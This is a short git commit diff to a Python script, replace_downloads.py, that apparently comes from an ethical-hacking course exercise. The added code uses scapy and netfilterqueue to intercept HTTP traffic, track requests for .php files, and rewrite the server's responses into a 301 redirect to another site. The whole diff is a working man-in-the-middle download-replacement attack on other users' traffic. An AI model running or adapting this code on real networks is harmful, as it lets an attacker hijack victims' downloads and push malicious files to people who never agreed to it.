47c118fb6fa76eb2aa651f7c0d779582bf5a3fe3
SantiCyberPirate <santicyberpirate@gmail.com>
2025-06-21 08:37:17 -0500

    Submitting final code from SCP profile

--- replace_downloads.py
+++ replace_downloads.py
@@ -2,11 +2,31 @@
 import netfilterqueue
 import scapy.all as scapy
 
+ack_list = []
+
+def set_load(packet, load):
+    packet[scapy.Raw].load = load
+    del packet[scapy.IP].len
+    del packet[scapy.IP].chksum
+    del packet[scapy.TCP].chksum
+    return packet
+
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
-    if scapy_packet.haslayer(scapy.DNSRR):
-        pass
-
+    if scapy_packet.haslayer(scapy.Raw):
+        if scapy_packet[scapy.TCP].dport == 80:
+            print("HTTP Request")
+            if ".php" in str(scapy_packet[scapy.Raw].load):
+                print(".php requested")
+                ack_list.append(scapy_packet[scapy.TCP].ack)
+                print(scapy_packet.show())
+        elif scapy_packet[scapy.TCP].sport == 80:
+            print("HTTP Response")
+            if scapy_packet[scapy.TCP].seq in ack_list:
+                ack_list.remove(scapy_packet[scapy.TCP].seq)
+                print("Replacing file")
+                modified_packet = set_load(scapy_packet,"HTTP/1.1 301 Moved Permenantly\nLocation: https://www.nfl.com/\n\n")
+                packet.set_payload(bytes(modified_packet))
     packet.accept()
 
 queue = netfilterqueue.NetfilterQueue()
